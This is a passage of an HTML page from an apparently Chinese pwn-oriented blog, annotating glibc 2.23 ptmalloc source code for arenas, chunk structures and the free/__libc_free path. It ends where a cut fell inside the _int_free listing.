    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/20/Ptmalloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9Aarena/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/20/Ptmalloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9Aarena/" class="post-title-link" itemprop="url">Ptmalloc源码分析：arena</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-04-20 01:32:08 / Modified: 01:34:03" itemprop="dateCreated datePublished" datetime="2022-04-20T01:32:08+08:00">2022-04-20</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SourceCodeAnalysis/" itemprop="url" rel="index"><span itemprop="name">SourceCodeAnalysis</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>1.5k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>1 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Ptmalloc源码分析：arena"><a href="#Ptmalloc源码分析：arena" class="headerlink" title="Ptmalloc源码分析：arena"></a>Ptmalloc源码分析：arena</h2><p>我们知道一个线程申请的 1个/多个 堆包含很多的信息：二进制位信息，多个 malloc_chunk 信息等这些堆需要东西来进行管理，那么Arena就是来管理线程中的这些堆的</p>
<ul>
<li>一个线程只有一个 arnea，并且这些线程的arnea都是独立的不是相同的</li>
<li>主线程的 arnea 称为 “main_arena”，子线程的arnea称为 “thread_arena”</li>
</ul>
<hr>
<p><strong>libc-2.23</strong></p>
<ul>
<li>管理 chunk 的结构体：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>管理 arena 的结构体：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> NBINS 128</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> INTERNAL_SIZE_T <span class="comment">/* 判断是否定义INTERNAL_SIZE_T */</span> </span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> INTERNAL_SIZE_T size_t </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">mutex_t</span> mutex; <span class="comment">/* 同步访问相关,互斥锁(用来保证同步) */</span></span><br><span class="line">    </span><br><span class="line">  <span class="keyword">int</span> flags; <span class="comment">/* 标志位(表示一些当前arena的特征) */</span></span><br><span class="line">    </span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS]; <span class="comment">/* Fastbins */</span></span><br><span class="line">    </span><br><span class="line">  mchunkptr top; <span class="comment">/* Top chunk */</span></span><br><span class="line">    </span><br><span class="line">  mchunkptr last_remainder; <span class="comment">/* 一个小请求的最近拆分的剩余部分 */</span></span><br><span class="line">    </span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>]; <span class="comment">/* 常规bins chunk的链表数组 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 因为每个bin链在bins数组中存储的是一个指针fd指针和一个bk指针,所以要NBINS*2 */</span> </span><br><span class="line">    <span class="comment">/* 又因为数组bins中索引为0,1的指针是不使用的,所以要减去2 */</span></span><br><span class="line">    <span class="comment">/* 下标1是unsorted bin,2-63是small bin,64-126是large bin,共126个bin */</span></span><br><span class="line">    </span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];  <span class="comment">/* Bitmap of bins(一个循环单链表) */</span></span><br><span class="line">    <span class="comment">/* 表示bin数组当中某一个下标的bin是否为空,用来在分配的时候加速 */</span></span><br><span class="line">    </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span> <span class="comment">/* 分配区全局链表 */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span> <span class="comment">/* 分配区空闲链表 */</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T attached_threads; <span class="comment">/* 连接到此arena的线程数 */</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T system_mem; <span class="comment">/* 用来跟踪当前被系统分配的内存总量 */</span></span><br><span class="line">  INTERNAL_SIZE_T max_system_mem; <span class="comment">/* 最多从该arena的系统分配的内存大小 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/20/Ptmalloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9Afree/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/20/Ptmalloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9Afree/" class="post-title-link" itemprop="url">Ptmalloc源码分析：free</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-04-20 01:32:06" itemprop="dateCreated datePublished" datetime="2022-04-20T01:32:06+08:00">2022-04-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-04-25 01:16:08" itemprop="dateModified" datetime="2022-04-25T01:16:08+08:00">2022-04-25</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SourceCodeAnalysis/" itemprop="url" rel="index"><span itemprop="name">SourceCodeAnalysis</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>23k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>21 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Ptmalloc源码分析：free"><a href="#Ptmalloc源码分析：free" class="headerlink" title="Ptmalloc源码分析：free"></a>Ptmalloc源码分析：free</h2><p>前几天被 free 给坑了，就一直报错搞得我很崩溃，痛定思痛，下定决心，看看 free 是怎么实现的</p>
<hr>
<h2 id="libc-2-23"><a href="#libc-2-23" class="headerlink" title="libc-2.23"></a>libc-2.23</h2><ul>
<li>杂项宏定义：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> RETURN_ADDRESS <span class="comment">/* 如果没有定义RETURN_ADDRESS */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RETURN_ADDRESS(X_) (NULL) <span class="comment">/* 宏定义为NULL */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) <span class="comment">/* 作为“参考数据” */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS)) <span class="comment">/* 获取真正的size */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ)) <span class="comment">/* 获取chunk头 */</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>关键结构体：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">mstate</span>;</span> <span class="comment">/* 管理arena的结构体 */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span> <span class="comment">/* 管理chunk的结构体 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>和M位相关的宏定义</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_MMAPPED 0x2 <span class="comment">/* M位的具体位置 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED) <span class="comment">/* 获取M位 */</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>和A位相关的宏定义</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NON_MAIN_ARENA 0x4 <span class="comment">/* A位的具体位置 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_non_main_arena(p) ((p)-&gt;size &amp; NON_MAIN_ARENA) <span class="comment">/* 获取A位 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> heap_for_ptr(ptr) \ <span class="comment">/* 根据chunk头地址,计算对应的thread_arena */</span></span></span><br><span class="line">  ((heap_info *) ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (ptr) &amp; ~(HEAP_MAX_SIZE - <span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_for_chunk(ptr) \ <span class="comment">/* 根据chunk头地址,获取对应的arena */</span></span></span><br><span class="line">  (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)</span><br><span class="line"><span class="comment">/* chunk-&gt;size中的A位可以检查程序是否属于main_arena,如果是就直接分配,如果不是就通过heap_for_ptr获取对应的thread_arena */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>和P位相关的宏定义</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse(p) \</span></span><br><span class="line"><span class="meta">  ((((mchunkptr) (((char *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))-&gt;size) &amp; PREV_INUSE)</span></span><br><span class="line"><span class="comment">/* 获取当前chunk的状态(通过nextchunk-&gt;P) */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_inuse(p) \</span></span><br><span class="line"><span class="meta">  ((mchunkptr) (((char *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))-&gt;size |= PREV_INUSE</span></span><br><span class="line"><span class="comment">/* 设置当前chunk为alloc(通过nextchunk-&gt;P) */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> clear_inuse(p) \</span></span><br><span class="line"><span class="meta">  ((mchunkptr) (((char *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))-&gt;size &amp;= ~(PREV_INUSE)</span></span><br><span class="line"><span class="comment">/* 设置当前chunk为free(通过nextchunk-&gt;P) */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_inuse(p)       ((p)-&gt;size &amp; PREV_INUSE) </span></span><br><span class="line"><span class="comment">/* 获取lastchunk的状态(lastchunk的状态设置比较简单,不需要格外的宏定义) */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse_bit_at_offset(p, s) \</span></span><br><span class="line"><span class="meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;size &amp; PREV_INUSE) </span></span><br><span class="line"><span class="comment">/* 获取nextchunk的状态(需要人工输入chunk-&gt;size) */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_inuse_bit_at_offset(p, s) \</span></span><br><span class="line"><span class="meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;size |= PREV_INUSE)</span></span><br><span class="line"><span class="comment">/* 设置nextchunk为alloc(需要人工输入chunk-&gt;size) */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> clear_inuse_bit_at_offset(p, s) \</span></span><br><span class="line"><span class="meta">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;size &amp;= ~(PREV_INUSE))</span></span><br><span class="line"><span class="comment">/* 设置nextchunk为free(需要人工输入chunk-&gt;size) */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>__libc_free：free函数的具体实现</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_free(<span class="keyword">void</span>* mem)</span><br><span class="line">&#123;</span><br><span class="line">    mstate ar_ptr; <span class="comment">/* 管理arena的结构体 */</span></span><br><span class="line">    mchunkptr p; <span class="comment">/* 管理chunk的结构体 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> (*hook) (<span class="keyword">void</span>*, <span class="keyword">const</span> <span class="keyword">void</span>*)</span><br><span class="line">        = atomic_forced_read(__free_hook); <span class="comment">/* 原子读获取__free_hook */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>)) <span class="comment">/* __builtin_expect可以提高效率 */</span></span><br><span class="line">    &#123;</span><br><span class="line">        (*hook)(mem, RETURN_ADDRESS(<span class="number">0</span>)); <span class="comment">/* 执行__free_hook */</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mem == <span class="number">0</span>) <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    p = mem2chunk(mem); <span class="comment">/* 通过指向chunk-&gt;FD的指针,获取指向chunk-&gt;head的指针 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (chunk_is_mmapped(p)) <span class="comment">/* 检查M位,看看该chunk是不是由mmap分配的 */</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* 查看动态brk/mmap阈值是否需要调整(不是重点) */</span></span><br><span class="line">        <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">            &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold</span><br><span class="line">            &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)</span><br><span class="line">        &#123;</span><br><span class="line">            mp_.mmap_threshold = chunksize(p);</span><br><span class="line">            mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">            LIBC_PROBE(memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">        munmap_chunk(p); <span class="comment">/* 调用munmap_chunk进行chunk的回收(不是重点) */</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ar_ptr = arena_for_chunk(p); <span class="comment">/* 根据chunk头地址,获取对应的arena */</span></span><br><span class="line">    _int_free(ar_ptr, p, <span class="number">0</span>); <span class="comment">/* 核心 */</span></span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def(__libc_free) <span class="comment">/* 标志修饰的函数在动态链接的过程中进行延迟绑定 */</span></span><br></pre></td></tr></table></figure>
<p>其实就是检查一下 <code>__free_hook</code> 中有没有东西（如果有就执行），再检查一下M位（进行调整），最后获取“对应的arena”，作为 <code>_int_free</code> 的参数</p>
<ul>
<li>杂项宏定义：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INTERNAL_SIZE_T size_t <span class="comment">/* 将其定义为&quot;size_t&quot; */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_SZ                (sizeof(INTERNAL_SIZE_T)) <span class="comment">/* 定义其大小为&quot;1字 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> TRIM_FASTBINS <span class="comment">/* 与&quot;fastbin是否会和top chunk合并&quot;有关的标志 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRIM_FASTBINS  0 <span class="comment">/* 默认为0(不合并) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s))) <span class="comment">/* 强制使p指针加上s,但不改变其指向 */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz) \ <span class="comment">/* 获取对应的下标 */</span></span></span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL) <span class="comment">/* 和fastbin合并机制有关 */</span></span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">通常fastbins中的fastchunk是不会进行合并的</span></span><br><span class="line"><span class="comment">当被free的fastchunk与相邻的chunk合并后的大小大于FASTBIN_CONSOLIDATION_THRESHOLD时</span></span><br><span class="line"><span class="comment">此时内存碎片可能就比较多了，我们就需要将fastbins中的chunk都进行合并</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">free_perturb</span> <span class="params">(<span class="keyword">char</span> *p, <span class="keyword">size_t</span> n)</span> <span class="comment">/* 设置perturb_byte(不清楚作用) */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (perturb_byte))</span><br><span class="line">    <span class="built_in">memset</span> (p, perturb_byte, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>和优化有关的宏定义：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> likely(x)      __builtin_expect(!!(x), 1) <span class="comment">/* 优化:大概率发生 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlikely(x)    __builtin_expect(!!(x), 0) <span class="comment">/* 优化:大概率不发生 */</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>和对齐有关的宏定义：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MALLOC_ALIGNMENT <span class="comment">/* MALLOC_ALIGNMENT的定义比较复杂,用于实现内存对齐 */</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> !SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_16)</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ &lt; __alignof__ (long double)      \</span></span><br><span class="line"><span class="meta">                                  ? __alignof__ (long double) : 2 *SIZE_SZ)</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ)</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0) <span class="comment">/* m判断是否对齐(这里的m通常为chunk-&gt;size) */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> misaligned_chunk(p) \</span></span><br><span class="line"><span class="meta">  ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem (p)) \</span></span><br><span class="line"><span class="meta">   &amp; MALLOC_ALIGN_MASK) <span class="comment">/* 实现p的对齐(具体什么原理我没有看懂) */</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>和更新 size，presize 有关的宏定义：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_head_size(p, s)  ((p)-&gt;size = (((p)-&gt;size &amp; SIZE_BITS) | (s)))</span></span><br><span class="line"><span class="comment">/* 更新chunk-&gt;size,不干扰其标志位 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_head(p, s)       ((p)-&gt;size = (s)) </span></span><br><span class="line"><span class="comment">/* 更新chunk-&gt;size,需要手动写入标志位 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_foot(p, s)       (((mchunkptr) ((char *) (p) + (s)))-&gt;prev_size = (s))</span></span><br><span class="line"><span class="comment">/* 更新nextchunk-&gt;prevsize,需要手动写入标志位 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>_int_free：<code>__libc_free</code> 的核心部分</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 